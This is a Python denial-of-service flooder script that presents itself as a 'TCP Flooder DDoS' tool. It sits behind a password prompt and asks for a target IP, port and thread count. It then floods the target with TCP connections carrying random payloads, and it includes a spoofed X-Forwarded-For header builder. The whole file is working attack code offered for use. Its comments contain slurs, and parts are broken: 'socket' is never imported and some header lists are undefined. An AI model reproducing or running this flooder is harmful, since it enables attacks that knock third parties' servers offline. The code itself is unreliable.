#Add The Proxy By Yourself Don't Ask Me To Add Proxy NERD
#I Will Add Socks5 Later
#Don't being an retarded skid


import sys
import os
import time
import random
import threading
import base64 as b64
from types import MethodType
import string
import json
import sys

pasw = "retarded"

for i in range(3):
    pwd = input("[+] Password Tools : ")
    j = 3
    if (pwd == pasw):
        print("[+] Please Wait\n")
        break
    else:
        time.sleep(2)
        print("[-] Wrong Password\n")
        continue
time.sleep(2)
print("[+] Succesfully Login")
time.sleep(2)

print("     ┌─────────────────────────────────────────────┐")
print("     │              TCP Flooder DDoS               │")
print("     ├─────────────────────────────────────────────┤")
print("     │ Methods:                                    │")
print("     │ [L4] TCP                                    │")
print("     │ [L4] UDP                                    │")
print("     ├─────────────────────────────────────────────┤")
print("     │      Never Being A Retarded Skids Nerd      │")
print("     └─────────────────────────────────────────────┘")
print("Github: https://github.com/AstroGanzz/tcp-flood-python/new/main")
print("OWner: AstroGanzz/IndentityClaw#0820")

ip = str(input("[+] Enter RDP IP : "))
port = int(input("[+] Enter RDP Port (80/3389/443)   : "))
times = int(input("[+] Enter Packet (900048) : "))
threads = int(input("[+] Enter Thread (900048) : "))
method_attack = str(input("[+] Enter Method udp | tcp : "))
fake_ip = '182.21.20.32'

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def Headers(method):
    header = ""
    if method == "udp" or method == "tcp":
        post_host = "POST | Ddos By AstroGanzz /1.1\r\nServer " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        accept = random.choice(acceptall) + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        referer = "Referer: " + random.choice(referers) + ip + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: 1\r\n"
        forward += "Client-IP: 10000\r\n"
        length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        header = post_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
    return header

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" </> Your Attack Ready To Sent </>!")
        except socket.error:
            s.close()
            print("</> Attack Sent!!! => ",ip," With Port : ",port,"!")
			
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
